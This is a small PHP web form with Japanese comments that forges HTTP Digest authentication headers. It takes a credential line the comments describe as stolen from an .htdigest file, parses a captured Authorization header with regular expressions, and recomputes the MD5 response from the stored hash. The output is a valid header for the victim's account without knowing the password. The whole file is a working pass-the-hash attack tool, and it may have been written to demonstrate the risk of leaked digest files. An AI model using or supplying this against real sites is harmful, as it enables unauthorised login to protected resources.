<?php
$credential = "";
if (isset($_GET['credential'])) {
  $credential = $_GET['credential'];  // .htdigestから盗んだクレデンシャル
  $method = $_GET['method'];          // HTTPメソッド
  $authorization = stripcslashes($_GET['auth']);  // Authorizationヘッダ。アンエスケープしておく
  preg_match('/nonce="(.+?)".*uri="(.+?)".*qop="?([^", ]+)"?.*nc=([0-9a-f]+).*cnonce="(.+?)"/i',
             $authorization, $matches);  // Authorizationヘッダからチャレンジのパラメータを正規表現で取得
  $nonce = $matches[1];      // nonce (ナンス:サーバー側で生成したランダム文字列)
  $uri = $matches[2];        // URI （URIと言いつつ中身はパス）
  $qop = $matches[3];        // qop （Quality of protection; authかauth-init）
  $nc = $matches[4];         // nc （リプレイ攻撃防止用の一連番号）
  $cnonce = $matches[5];     // cnonce (ブラウザ側で生成したランダム文字列)
  preg_match('/\A(.+):(.+):(.+)\z/i', $credential, $matches);
  $user = $matches[1];       // クレデンシャルからユーザー名を得る
  $a1 = $matches[3];         // クレデンシャルからMD5(A1)を得る
  $a2 = md5("$method:$uri"); // MD5(A2) コンテンツの情報からのハッシュ値
  $response = md5("$a1:$nonce:$nc:$cnonce:$qop:$a2");  // チャレンジに対するレスポンス
  $authorization = preg_replace('/response=".+?"/', "response=\"$response\"", $authorization);
  $authorization = preg_replace('/username=".+?"/', "username=\"$user\"", $authorization);
  echo htmlspecialchars($authorization);  //再計算したresponseを含むAuthrizationヘッダを表示
}
?><body>
<form action="">
credentail <input name="credential" value="<?php echo htmlspecialchars($credential); ?>"><br>
authorization <input name="auth"><br>
method <input name="method" value="GET"><br>
<input type="submit">
</form>
</body>
